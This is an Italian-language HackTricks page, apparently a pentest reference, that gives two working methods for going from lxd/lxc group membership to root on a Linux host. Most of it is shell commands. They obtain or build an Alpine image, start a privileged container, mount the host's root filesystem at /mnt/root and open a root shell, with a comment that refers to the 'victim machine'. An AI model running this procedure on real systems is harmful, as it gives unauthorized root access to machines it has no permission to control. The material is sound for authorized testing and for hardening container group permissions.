# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Se appartieni al gruppo _**lxd**_ **o** _**lxc**_, puoi diventare root

## Sfruttare senza internet

### Metodo 1

Puoi scaricare un'immagine alpine da utilizzare con lxd da un repository fidato. Canonical pubblica build giornaliere sul loro sito: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) 
Basta prendere sia **lxd.tar.xz** che **rootfs.squashfs** dall'ultima build. (Il nome della directory è la data).

In alternativa, puoi installare su macchina questo builder di distribuzioni: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (segui le istruzioni del github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Carica i file **incus.tar.xz** (**lxd.tar.xz** se li hai scaricati dal repository Canonical) e **rootfs.squashfs**, aggiungi l'immagine al repository e crea un contenitore:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Se trovi questo errore _**Errore: Nessun pool di archiviazione trovato. Si prega di creare un nuovo pool di archiviazione**_\
> Esegui **`lxd init`** e imposta tutte le opzioni su predefinito. Poi **ripeti** il blocco di comandi precedente

Infine puoi eseguire il contenitore e ottenere root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metodo 2

Crea un'immagine Alpine e avviala utilizzando il flag `security.privileged=true`, costringendo il container a interagire come root con il filesystem dell'host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
